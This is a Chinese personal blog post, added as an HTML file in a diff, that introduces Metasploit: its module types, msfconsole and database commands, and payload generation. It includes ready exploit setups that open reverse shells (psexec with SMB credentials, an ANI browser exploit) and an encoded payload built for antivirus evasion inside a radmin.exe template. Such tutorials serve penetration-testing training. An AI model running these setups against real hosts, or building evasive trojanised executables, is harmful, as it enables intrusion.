@@ -1,0 +1,465 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>MSF(一)基本了解和常用命令 | 狗剩儿</title>
+<meta name="description" content="小菜鸡。" />
+<link rel="shortcut icon" href="https://foolb.github.io//favicon.ico?v=1577108990368">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://foolb.github.io//styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://foolb.github.io/">
+  <img class="avatar" src="https://foolb.github.io//images/avatar.png?v=1577108990368" alt="">
+  </a>
+  <h1 class="site-title">
+    狗剩儿
+  </h1>
+  <p class="site-description">
+    小菜鸡。
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              MSF(一)基本了解和常用命令
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-12-23
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="数据库初始化">数据库初始化</h2>
+<pre><code class="language-bash">msfdb
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://foolb.github.io//post-images/image-20191215000539583.png" alt="image-20191215000539583"></figure>
+<h2 id="modules-详解">modules 详解</h2>
+<h3 id="exploits">Exploits</h3>
+<figure data-type="image" tabindex="2"><img src="https://foolb.github.io//post-images/image-20191215103154039.png" alt="image-20191215103154039"></figure>
+<p>利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</p>
+<h3 id="payload">payload</h3>
+<p>成功exploit之后，真正在目标系统执行的代码或指令</p>
+<figure data-type="image" tabindex="3"><img src="https://foolb.github.io//post-images/image-20191215113934376.png" alt="image-20191215113934376"></figure>
+<pre><code>默认有三种 payload
+
+Singles：all-in-one 是自包含的、完全独立的攻击载荷，其运行如同运行一个小的可执行文件一样。
+
+Stagers：目标计算机内存有限时，先传输一个较小的 payload 用于建立连接
+
+Stages：利用 stager 建立的连接下载的后续 payload, stages 载荷的主要作用在于，它可以利用微小的stagers载荷以适应那些漏洞利用空间狭小的漏洞完成攻击。在漏洞攻击过程中，漏洞攻击开发者能够支配的内存空间非常有限。stagers 则可以利用这些空间，其主要工作就是完成 stages 载荷的剩余任务。
+
+Stager、Stages 都有多种类型，适用于不同场景
+
+Shellcode 是 payload 的一种，由于其建立正向/反向 shell 而得名
+</code></pre>
+<h3 id="auxiliary">Auxiliary</h3>
+<p>执行信息收集、枚举、指纹探测、扫描等功能的辅助模块</p>
+<h3 id="encoders">Encoders</h3>
+<p>对payload进行加密，躲避AV检查的模块</p>
+<h3 id="nops">Nops</h3>
+<p>提高payload 稳定性及维持大小</p>
+<h3 id="evasion">Evasion</h3>
+<h3 id="post">Post</h3>
+<h2 id="msfconsole-控制台命令">msfconsole 控制台命令</h2>
+<pre><code class="language-bash">help / ? # 查看当前可用的命令
+help command / ? command # 查看某个命令详细的用法
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://foolb.github.io//post-images/image-20191215122519342.png" alt="image-20191215122519342"></figure>
+<h3 id="banner">banner</h3>
+<h3 id="color">color</h3>
+<h3 id="connect-类似于-msf-下的nc">connect # 类似于 MSF 下的NC</h3>
+<pre><code>Usage: connect [options] &lt;host&gt; &lt;port&gt;
+
+Communicate with a host, similar to interacting via netcat, taking advantage of
+any configured session pivoting.
+
+OPTIONS:
+
+    -C        Try to use CRLF for EOL sequence.
+    -P &lt;opt&gt;  Specify source port.
+    -S &lt;opt&gt;  Specify source address.
+    -c &lt;opt&gt;  Specify which Comm to use.
+    -h        Help banner.
+    -i &lt;opt&gt;  Send the contents of a file.
+    -p &lt;opt&gt;  List of proxies to use.
+    -s        Connect with SSL.
+    -u        Switch to a UDP socket.
+    -w &lt;opt&gt;  Specify connect timeout.
+    -z        Just try to connect, then return.
+</code></pre>
+<p>tips：在MSF里是可以执行系统命令的(ls，cat...)所以当然也可以执行nc.</p>
+<h3 id="show">*show</h3>
+<pre><code>msf5 &gt; help show 
+[*] Valid parameters for the &quot;show&quot; command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options
+[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions
+</code></pre>
+<h4 id="rank">rank</h4>
+<p>manual &lt; low  &lt; average &lt; normal &lt; good &lt; great &lt; excellent</p>
+<h3 id="search">search</h3>
+<pre><code>msf5 &gt; search -h
+Usage: search [&lt;options&gt;] [&lt;keywords&gt;]
+
+If no options or keywords are provided, cached results are displayed.
+
+OPTIONS:
+  -h                Show this help information
+  -o &lt;file&gt;         Send output to a file in csv format
+  -S &lt;string&gt;       Search string for row filter
+  -u                Use module if there is one result
+
+Keywords:
+  aka         :  Modules with a matching AKA (also-known-as) name
+  author      :  Modules written by this author
+  arch        :  Modules affecting this architecture
+  bid         :  Modules with a matching Bugtraq ID
+  cve         :  Modules with a matching CVE ID
+  edb         :  Modules with a matching Exploit-DB ID
+  check       :  Modules that support the 'check' method
+  date        :  Modules with a matching disclosure date
+  description :  Modules with a matching description
+  fullname    :  Modules with a matching full name
+  mod_time    :  Modules with a matching modification date
+  name        :  Modules with a matching descriptive name
+  path        :  Modules with a matching path
+  platform    :  Modules affecting this platform
+  port        :  Modules with a matching port
+  rank        :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
+  ref         :  Modules with a matching ref
+  reference   :  Modules with a matching reference
+  target      :  Modules affecting this target
+  type        :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)
+
+Examples:
+  search cve:2009 type:exploit platform:aix name:mysql
+</code></pre>
+<h3 id="use">use</h3>
+<pre><code class="language-bash">msf5 &gt; use exploit/windows/smb/ms08_067_netapi
+</code></pre>
+<h4 id="show-info">[show] info</h4>
+<figure data-type="image" tabindex="5"><img src="https://foolb.github.io//post-images/image-20191215143213086.png" alt="image-20191215143213086"></figure>
+<h4 id="show-options">[show] options</h4>
+<h4 id="show-targets">show targets</h4>
+<h4 id="show-advanced">show advanced</h4>
+<h4 id="show-payloads">show payloads</h4>
+<h4 id="show-evasion">show evasion</h4>
+<h4 id="show-missing">show missing</h4>
+<h4 id="set-unset-setg-unsetg-save">set / unset / setg / unsetg / save</h4>
+<pre><code class="language-bash">set rhosts 192.168.1.1-192.168.1.100
+set rhosts 192.168.1.0/24, 192.168.2.1-192.168.2.100(逗号后面有个空格)
+set rhosts file:/root/ip.txt
+
+......
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://foolb.github.io//post-images/image-20191215170749133.png" alt="image-20191215170749133"></figure>
+<h4 id="edit">edit</h4>
+<h4 id="check">check</h4>
+<h4 id="back">back</h4>
+<h4 id="run-exploit">run / exploit</h4>
+<figure data-type="image" tabindex="7"><img src="https://foolb.github.io//post-images/image-20191215164033612.png" alt="image-20191215164033612"></figure>
+<h3 id="db_status">db_status</h3>
+<figure data-type="image" tabindex="8"><img src="https://foolb.github.io//post-images/image-20191215150842628.png" alt="image-20191215150842628"></figure>
+<h3 id="db_connect-db_disconnect">db_connect / db_disconnect</h3>
+<figure data-type="image" tabindex="9"><img src="https://foolb.github.io//post-images/image-20191215151959109.png" alt="image-20191215151959109"></figure>
+<pre><code class="language-bash">/usr/share/metasploit-framework/config/database.yml
+</code></pre>
+<h3 id="db_nmap">db_nmap</h3>
+<p>和在命令行直接使用 nmap 并没有什么不同，只是 db_nmap 扫描出的数据会存在数据库中。</p>
+<figure data-type="image" tabindex="10"><img src="https://foolb.github.io//post-images/image-20191215153022009.png" alt="image-20191215153022009"></figure>
+<h4 id="hosts">hosts</h4>
+<pre><code>Hosts / hosts 10.10.10.129 / hosts -u / hosts -c address,os_flavor -S Linux
+
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://foolb.github.io//post-images/image-20191215153103720.png" alt="image-20191215153103720"></figure>
+<figure data-type="image" tabindex="12"><img src="https://foolb.github.io//post-images/image-20191215160402402.png" alt="image-20191215160402402"></figure>
+<figure data-type="image" tabindex="13"><img src="https://foolb.github.io//post-images/image-20191215160617005.png" alt="image-20191215160617005"></figure>
+<h4 id="services">services</h4>
+<pre><code>services / services -S 445 / services -p 80 / services -c info,name -p 1-1000
+
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://foolb.github.io//post-images/image-20191215162107247.png" alt="image-20191215162107247"></figure>
+<h3 id="creds-显示暴力破解结果">creds # 显示暴力破解结果</h3>
+<figure data-type="image" tabindex="15"><img src="https://foolb.github.io//post-images/image-20191215164407058.png" alt="image-20191215164407058"></figure>
+<h3 id="vulns-显示扫描漏洞结果">vulns # 显示扫描漏洞结果</h3>
+<figure data-type="image" tabindex="16"><img src="https://foolb.github.io//post-images/image-20191215164737106.png" alt="image-20191215164737106"></figure>
+<h3 id="loot-查看hash结果">loot # 查看hash结果</h3>
+<h3 id="db_import-db_export">db_import / db_export</h3>
+<figure data-type="image" tabindex="17"><img src="https://foolb.github.io//post-images/image-20191215165709542.png" alt="image-20191215165709542"></figure>
+<figure data-type="image" tabindex="18"><img src="https://foolb.github.io//post-images/image-20191215165652198.png" alt="image-20191215165652198"></figure>
+<figure data-type="image" tabindex="19"><img src="https://foolb.github.io//post-images/image-20191215165919735.png" alt="image-20191215165919735"></figure>
+<figure data-type="image" tabindex="20"><img src="https://foolb.github.io//post-images/image-20191215165215335.png" alt="image-20191215165215335"></figure>
+<h3 id="jobs-kill-id">jobs / kill ID</h3>
+<h3 id="sessions">sessions</h3>
+<h3 id="load-unload">load / unload</h3>
+<p>以插件的形式调用第三方工具（nessus，nexpose，openvas）</p>
+<figure data-type="image" tabindex="21"><img src="https://foolb.github.io//post-images/image-20191215174202989.png" alt="image-20191215174202989"></figure>
+<figure data-type="image" tabindex="22"><img src="https://foolb.github.io//post-images/image-20191215174348477.png" alt="image-20191215174348477"></figure>
+<h3 id="loadpath">loadpath</h3>
+<figure data-type="image" tabindex="23"><img src="https://foolb.github.io//post-images/image-20191215174758358.png" alt="image-20191215174758358"></figure>
+<h3 id="route-通过指定-session-路由流量">route # 通过指定 session 路由流量</h3>
+<pre><code class="language-bash">route add 10.10.10.0/24 1
+</code></pre>
+<figure data-type="image" tabindex="24"><img src="https://foolb.github.io//post-images/image-20191215181224344.png" alt="image-20191215181224344"></figure>
+<h3 id="irb-进入-ruby-脚本模式">irb # 进入 Ruby 脚本模式</h3>
+<h3 id="resource-rrcmsfconsole-r-arc">resource r.rc(msfconsole -r a.rc)</h3>
+<figure data-type="image" tabindex="25"><img src="https://foolb.github.io//post-images/image-20191215183535567.png" alt="image-20191215183535567"></figure>
+<figure data-type="image" tabindex="26"><img src="https://foolb.github.io//post-images/image-20191215183606468.png" alt="image-20191215183606468"></figure>
+<figure data-type="image" tabindex="27"><img src="https://foolb.github.io//post-images/image-20191215183728094.png" alt="image-20191215183728094"></figure>
+<h2 id="exploit-模块">Exploit 模块</h2>
+<h3 id="active-exploit">Active Exploit</h3>
+<pre><code class="language-bash">– use exploit/windows/smb/psexec
+– set RHOST 192.168.1.100
+– set PAYLOAD windows/shell/reverse_tcp
+– set LHOST 192.168.1.1
+– set LPORT 4444
+– set SMBUSER user1
+– set SMBPASS pass1
+– exploit
+</code></pre>
+<h3 id="passive-exploit">Passive Exploit</h3>
+<pre><code class="language-bash">– use exploit/windows/browser/ms07_017_ani_loadimage_chunksize
+– set URIPATH /
+– set PAYLOAD windows/shell/reverse_tcp
+– set LHOST 192.168.1.1
+– set LPORT 4444
+– exploit
+</code></pre>
+<h2 id="生成-payload">生成 payload</h2>
+<h3 id="msf-自动选择编码模块绕过坏字符">msf 自动选择编码模块绕过坏字符</h3>
+<pre><code class="language-bash">generate
+
+generate -b '\x00'
+
+generate -b '\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b'
+
+generate -b '\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b
+\xFF\x0a\x0b\x01\xcc\6e\x1e\x2e\x26' 
+</code></pre>
+<figure data-type="image" tabindex="28"><img src="https://foolb.github.io//post-images/image-20191216124506252.png" alt="image-20191216124506252"></figure>
+<figure data-type="image" tabindex="29"><img src="https://foolb.github.io//post-images/image-20191216124552007.png" alt="image-20191216124552007"></figure>
+<h3 id="手动指定编码模块">手动指定编码模块</h3>
+<pre><code class="language-bash">show encoders
+
+generate -e x86/nonalpha
+</code></pre>
+<figure data-type="image" tabindex="30"><img src="https://foolb.github.io//post-images/image-20191216125602408.png" alt="image-20191216125602408"></figure>
+<pre><code class="language-bash">generate -b '\x00' -f exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -p x64 -o /root/1.exe
+</code></pre>
+<figure data-type="image" tabindex="31"><img src="https://foolb.github.io//post-images/image-20191216130855848.png" alt="image-20191216130855848"></figure>
+<figure data-type="image" tabindex="32"><img src="https://foolb.github.io//post-images/image-20191216131010244.png" alt="image-20191216131010244"></figure>
+<h4 id="nopno-operation-next-operation无任何操作">NOP：no-operation / Next Operation（无任何操作）</h4>
+<p>EIP返回到存储NOP sled的任意地址时将递增，最终导致shellcode执行</p>
+<pre><code class="language-bash">generate -n 14
+</code></pre>
+<figure data-type="image" tabindex="33"><img src="https://foolb.github.io//post-images/image-20191216132829883.png" alt="image-20191216132829883"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%9D%E5%A7%8B%E5%8C%96">数据库初始化</a></li>
+<li><a href="#modules-%E8%AF%A6%E8%A7%A3">modules 详解</a>
+<ul>
+<li><a href="#exploits">Exploits</a></li>
+<li><a href="#payload">payload</a></li>
+<li><a href="#auxiliary">Auxiliary</a></li>
+<li><a href="#encoders">Encoders</a></li>
+<li><a href="#nops">Nops</a></li>
+<li><a href="#evasion">Evasion</a></li>
+<li><a href="#post">Post</a></li>
+</ul>
+</li>
+<li><a href="#msfconsole-%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4">msfconsole 控制台命令</a>
+<ul>
+<li><a href="#banner">banner</a></li>
+<li><a href="#color">color</a></li>
+<li><a href="#connect-%E7%B1%BB%E4%BC%BC%E4%BA%8E-msf-%E4%B8%8B%E7%9A%84nc">connect # 类似于 MSF 下的NC</a></li>
+<li><a href="#show">*show</a>
+<ul>
+<li><a href="#rank">rank</a></li>
+</ul>
+</li>
+<li><a href="#search">search</a></li>
+<li><a href="#use">use</a>
+<ul>
+<li><a href="#show-info">[show] info</a></li>
+<li><a href="#show-options">[show] options</a></li>
+<li><a href="#show-targets">show targets</a></li>
+<li><a href="#show-advanced">show advanced</a></li>
+<li><a href="#show-payloads">show payloads</a></li>
+<li><a href="#show-evasion">show evasion</a></li>
+<li><a href="#show-missing">show missing</a></li>
+<li><a href="#set-unset-setg-unsetg-save">set / unset / setg / unsetg / save</a></li>
+<li><a href="#edit">edit</a></li>
+<li><a href="#check">check</a></li>
+<li><a href="#back">back</a></li>
+<li><a href="#run-exploit">run / exploit</a></li>
+</ul>
+</li>
+<li><a href="#db_status">db_status</a></li>
+<li><a href="#db_connect-db_disconnect">db_connect / db_disconnect</a></li>
+<li><a href="#db_nmap">db_nmap</a>
+<ul>
+<li><a href="#hosts">hosts</a></li>
+<li><a href="#services">services</a></li>
+</ul>
+</li>
+<li><a href="#creds-%E6%98%BE%E7%A4%BA%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E7%BB%93%E6%9E%9C">creds # 显示暴力破解结果</a></li>
+<li><a href="#vulns-%E6%98%BE%E7%A4%BA%E6%89%AB%E6%8F%8F%E6%BC%8F%E6%B4%9E%E7%BB%93%E6%9E%9C">vulns # 显示扫描漏洞结果</a></li>
+<li><a href="#loot-%E6%9F%A5%E7%9C%8Bhash%E7%BB%93%E6%9E%9C">loot # 查看hash结果</a></li>
+<li><a href="#db_import-db_export">db_import / db_export</a></li>
+<li><a href="#jobs-kill-id">jobs / kill ID</a></li>
+<li><a href="#sessions">sessions</a></li>
+<li><a href="#load-unload">load / unload</a></li>
+<li><a href="#loadpath">loadpath</a></li>
+<li><a href="#route-%E9%80%9A%E8%BF%87%E6%8C%87%E5%AE%9A-session-%E8%B7%AF%E7%94%B1%E6%B5%81%E9%87%8F">route # 通过指定 session 路由流量</a></li>
+<li><a href="#irb-%E8%BF%9B%E5%85%A5-ruby-%E8%84%9A%E6%9C%AC%E6%A8%A1%E5%BC%8F">irb # 进入 Ruby 脚本模式</a></li>
+<li><a href="#resource-rrcmsfconsole-r-arc">resource r.rc(msfconsole -r a.rc)</a></li>
+</ul>
+</li>
+<li><a href="#exploit-%E6%A8%A1%E5%9D%97">Exploit 模块</a>
+<ul>
+<li><a href="#active-exploit">Active Exploit</a></li>
+<li><a href="#passive-exploit">Passive Exploit</a></li>
+</ul>
+</li>
+<li><a href="#%E7%94%9F%E6%88%90-payload">生成 payload</a>
+<ul>
+<li><a href="#msf-%E8%87%AA%E5%8A%A8%E9%80%89%E6%8B%A9%E7%BC%96%E7%A0%81%E6%A8%A1%E5%9D%97%E7%BB%95%E8%BF%87%E5%9D%8F%E5%AD%97%E7%AC%A6">msf 自动选择编码模块绕过坏字符</a></li>
+<li><a href="#%E6%89%8B%E5%8A%A8%E6%8C%87%E5%AE%9A%E7%BC%96%E7%A0%81%E6%A8%A1%E5%9D%97">手动指定编码模块</a>
+<ul>
+<li><a href="#nopno-operation-next-operation%E6%97%A0%E4%BB%BB%E4%BD%95%E6%93%8D%E4%BD%9C">NOP：no-operation / Next Operation（无任何操作）</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://foolb.github.io//post/2">
+              <h3 class="post-title">
+                Msfvenom 命令自动补全
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | 
+  <a class="rss" href="https://foolb.github.io//atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+
+  let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+  // This should probably be throttled.
+  // Especially because it triggers during smooth scrolling.
+  // https://lodash.com/docs/4.17.10#throttle
+  // You could do like...
+  // window.addEventListener("scroll", () => {
+  //    _.throttle(doThatStuff, 100);
+  // });
+  // Only not doing it here to keep this Pen dependency-free.
+
+  window.addEventListener("scroll", event => {
+    let fromTop = window.scrollY;
+
+    mainNavLinks.forEach((link, index) => {
+      let section = document.getElementById(decodeURI(link.hash).substring(1));
+      let nextSection = null
+      if (mainNavLinks[index + 1]) {
+        nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+      }
+      if (section.offsetTop <= fromTop) {
+        if (nextSection) {
+          if (nextSection.offsetTop > fromTop) {
+            link.classList.add("current");
+          } else {
+            link.classList.remove("current");    
+          }
+        } else {
+          link.classList.add("current");
+        }
+      } else {
+        link.classList.remove("current");
+      }
+    });
+  });
+
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
